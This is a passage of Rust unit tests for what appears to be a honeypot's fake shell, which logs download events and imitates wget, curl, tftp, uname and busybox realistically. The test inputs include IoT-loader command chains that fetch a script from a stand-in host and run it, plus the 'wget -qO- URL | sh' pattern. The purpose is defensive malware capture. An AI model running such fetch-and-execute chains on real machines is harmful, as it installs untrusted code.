    fn a_line_fetching_two_different_urls_emits_two_download_events() {
        let (_out, events) = shell().handle_input(
            "wget http://198.51.100.9/a; tftp -g 198.51.100.9 -r b; wget http://198.51.100.9/a",
        );
        let urls: Vec<_> = events
            .iter()
            .filter(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .map(|e| e.metadata["url"].as_str().unwrap().to_string())
            .collect();
        assert_eq!(
            urls,
            vec!["http://198.51.100.9/a", "tftp://198.51.100.9/b"],
            "one event per distinct URL, in first-seen order"
        );
    }

    #[test]
    fn a_bare_tftp_line_emits_a_download_event_with_a_real_url() {
        let (_out, events) = shell().handle_input("tftp -g 198.51.100.9 -r tftp");
        let dl = events
            .iter()
            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .expect("a bare tftp fetch must emit a download event");
        assert_eq!(dl.metadata["url"], "tftp://198.51.100.9/tftp");
    }

    #[test]
    fn busybox_applet_set() {
        assert!(is_busybox_applet("wget"));
        assert!(is_busybox_applet("sh"));
        assert!(!is_busybox_applet("MIRAI"));
    }

    #[test]
    fn wget_derives_the_saved_filename_from_the_url() {
        let out = cmd_wget(&["wget", "http://198.51.100.9/bins/mips"]);
        assert!(out.contains("Saving to: 'mips'"), "got: {out}");
        assert!(
            !out.contains("index.html"),
            "constant filename tell remains: {out}"
        );
    }

    #[test]
    fn wget_quiet_suppresses_the_banner() {
        assert_eq!(cmd_wget(&["wget", "-q", "http://x/y"]), "");
    }

    #[test]
    fn wget_dash_big_o_dash_writes_body_to_stdout() {
        // The `wget -qO- URL | sh` loader pattern: content goes to stdout, not a transcript.
        let out = cmd_wget(&["wget", "-qO-", "http://x/y"]);
        assert!(out.contains("It works!"), "got: {out}");
    }

    #[test]
    fn curl_dash_big_o_is_silent_on_stdout() {
        // A real `curl -O URL` writes a file and prints nothing to stdout - the old code printed the
        // body, a clean one-probe tell.
        assert_eq!(cmd_curl(&["curl", "-O", "http://x/y"]), "");
        assert_eq!(cmd_curl(&["curl", "-o", "out", "http://x/y"]), "");
        // Without -o/-O, curl prints the body to stdout.
        assert!(cmd_curl(&["curl", "http://x/y"]).contains("It works!"));
    }

    #[test]
    fn ping_is_not_command_not_found() {
        let (out, _) = shell().handle_input("ping 8.8.8.8");
        assert!(out.contains("ping statistics"), "got: {out}");
        assert!(!out.contains("command not found"), "got: {out}");
    }

    #[test]
    fn sh_dash_c_wget_chain_is_captured_as_a_download() {
        let (_, events) =
            shell().handle_input("sh -c \"wget http://198.51.100.9/x.sh; chmod +x x.sh; ./x.sh\"");
        let dl = events
            .iter()
            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .expect("a wget URL inside sh -c must still be captured");
        assert_eq!(dl.metadata["url"], "http://198.51.100.9/x.sh");
    }

    #[test]
    fn url_scan_only_fires_with_a_fetch_verb() {
        assert_eq!(
            url_if_fetch_line("wget http://a/b"),
            Some("http://a/b"),
            "fetch verb + url should capture"
        );
        assert_eq!(
            url_if_fetch_line("echo http://a/b"),
            None,
            "a bare echo of a url is not a download"
        );
    }

    #[test]
    fn uname_m_returns_only_the_machine_field() {
        // The #1 IoT-loader recon command: `uname -m` must print exactly the arch, not the whole
        // `uname -a` line (the old shortcut returned uname_all for any flag - a one-probe tell that
        // also broke arch-based payload selection).
        assert_eq!(cmd_uname(&["uname", "-m"]), "x86_64\n");
        assert_eq!(cmd_uname(&["uname", "-p"]), "x86_64\n");
    }

    #[test]
    fn uname_single_fields_are_selected_individually() {
        assert_eq!(cmd_uname(&["uname", "-s"]), "Linux\n");
        assert_eq!(cmd_uname(&["uname", "-r"]), "5.15.0-91-generic\n");
        assert_eq!(cmd_uname(&["uname", "-n"]), "server01\n");
    }

    #[test]
    fn uname_combined_flags_print_fields_in_canonical_order() {
        // Multiple flags print the selected fields in coreutils' fixed order regardless of the flag
        // order given.
        assert_eq!(cmd_uname(&["uname", "-sr"]), "Linux 5.15.0-91-generic\n");
        assert_eq!(cmd_uname(&["uname", "-rs"]), "Linux 5.15.0-91-generic\n");
        assert_eq!(
            cmd_uname(&["uname", "-s", "-r"]),
            "Linux 5.15.0-91-generic\n"
        );
    }

    #[test]
    fn uname_a_and_bare_keep_their_historical_output() {
        // Regression guard: the forms that were already correct must not change.
        assert_eq!(
            cmd_uname(&["uname", "-a"]),
            "Linux server01 5.15.0-91-generic #101-Ubuntu SMP x86_64 x86_64 x86_64 GNU/Linux\n"
        );
        assert_eq!(cmd_uname(&["uname"]), "Linux\n");
    }

    #[test]
    fn chmod_and_drop_chain_verbs_are_silent_successes() {
        // `chmod +x x` returning "command not found" is impossible on real Linux and aborts the
        // loader before it runs its payload - the most direct capture-costing tell in the shell.
        let (out, _) = shell().handle_input("chmod +x /tmp/x");
        assert_eq!(out, "");
        for cmd in ["cp a b", "rm x", "mkdir d", "sleep 1"] {
            let (o, _) = shell().handle_input(cmd);
            assert_eq!(o, "", "{cmd} should be a silent success, got {o:?}");
        }
    }

    #[test]
    fn busybox_chmod_dispatches_instead_of_applet_not_found() {
        // The banner advertises chmod; `busybox chmod` must run it, not contradict the banner.
        let (out, _) = shell().handle_input("busybox chmod +x x");
        assert_eq!(out, "");
    }

    #[test]
    fn busybox_banner_and_applet_set_never_contradict() {
        // Both are derived from BUSYBOX_APPLETS, so every advertised applet is recognized and every
        // recognized applet is advertised - the banner-vs-applet contradiction is impossible.
        let banner = busybox_banner();
        for applet in BUSYBOX_APPLETS {
            assert!(
                is_busybox_applet(applet),
                "{applet} advertised but not recognized"
            );
            assert!(
                banner.contains(applet),
                "{applet} recognized but not advertised"
            );
        }
        // curl is not a real BusyBox applet, so `busybox curl` is applet-not-found and it is absent
        // from the banner.
        assert!(!is_busybox_applet("curl"));
        assert!(!banner.contains("curl"));
        let (out, _) = shell().handle_input("busybox curl http://x/y");
        assert!(out.contains("curl: applet not found"), "got: {out}");
    }
}
